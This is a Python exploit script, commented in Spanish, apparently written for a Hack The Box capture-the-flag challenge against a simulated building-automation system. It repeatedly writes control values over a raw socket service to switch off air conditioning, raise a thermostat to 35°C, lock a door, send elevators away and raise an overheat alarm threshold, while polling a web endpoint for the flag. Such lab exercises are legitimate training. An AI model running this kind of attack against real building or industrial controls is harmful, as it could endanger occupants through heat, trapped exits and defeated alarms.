import socket
import time
import json
import urllib.request
import re

HOST = "154.57.164.73"
BP = 31900
WP = 32494

def bw(ot, oid, p, v):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((HOST, BP))
        s.recv(4096)
        s.sendall(b"3\n")
        time.sleep(0.06)
        s.recv(4096)
        s.sendall(f"{ot} {oid} {p} {v}\n".encode())
        time.sleep(0.06)
        r = s.recv(4096).decode()
        s.close()
        return "True" in r
    except:
        return False

def gd():
    try:
        req = urllib.request.urlopen(f"http://{HOST}:{WP}/data", timeout=3)
        return json.loads(req.read().decode())
    except:
        return {}

print("=== CONTINUANDO EXPLOIT - Temp ya ~32°C ===")

# Re-enforce todo con termostato más alto
bw("analogOutput", 23, "presentValue", 99)
bw("multiStateOutput", 102, "presentValue", 2)
bw("binaryOutput", 22, "presentValue", 0)
bw("analogOutput", 21, "presentValue", 35)  # 35°C para margen
bw("analogOutput", 82, "presentValue", 3)
bw("analogOutput", 85, "presentValue", 1)

d = gd()
print(f"Estado: T={d.get('Temp-L2-20',{}).get('presentValue','?')} D={d.get('L2-TSR-DR',{}).get('presentValue','?')} AC={d.get('ACS-L2-22',{}).get('presentValue','?')} Al={d.get('OHA-L2-24',{}).get('presentValue','?')} E1TF={d.get('ELE-1-TF',{}).get('presentValue','?')} E2TF={d.get('ELE-2-TF',{}).get('presentValue','?')}")

start = time.time()
found = False

while time.time() - start < 300 and not found:
    el = int(time.time() - start)
    
    # Enforce rápido - solo los críticos
    bw("binaryOutput", 22, "presentValue", 0)     # AC OFF
    bw("analogOutput", 21, "presentValue", 35)     # Therm HIGH
    bw("analogOutput", 23, "presentValue", 99)     # OHAP safe
    bw("multiStateOutput", 102, "presentValue", 2) # Door locked
    bw("analogOutput", 82, "presentValue", 3)      # ELE1 away
    bw("analogOutput", 85, "presentValue", 1)      # ELE2 away
    
    if el % 10 == 0:
        d = gd()
        if d:
            t = d.get('Temp-L2-20',{}).get('presentValue',0)
            al = d.get('OHA-L2-24',{}).get('presentValue',0)
            mp = d.get('Message',{}).get('presentValue',0)
            md = d.get('Message',{}).get('Description','')
            dr = d.get('L2-TSR-DR',{}).get('presentValue',0)
            ac = d.get('ACS-L2-22',{}).get('presentValue',0)
            
            print(f"  [{el:3d}s] T={t} D={dr} AC={ac} Al={al} M={mp}'{md[:60]}'")
            
            if al == 1:
                print("  ALARMA!")
                break
            
            full = json.dumps(d)
            if 'HTB{' in full:
                flags = re.findall(r'HTB\{[^}]+\}', full)
                print(f"\nFLAG: {flags[0]}")
                found = True
                break
            
            if md and 'alarm' not in md.lower() and md.strip():
                print(f"\nMSG: '{md}'")
                if 'HTB' in md:
                    found = True
                    break
    
    time.sleep(0.2)

if not found:
    d = gd()
    print(f"\nFinal: {d.get('Message',{})}")
    for k in sorted(d.keys()):
        print(f"  {k}: {d[k]['presentValue']}")
print("Done.")
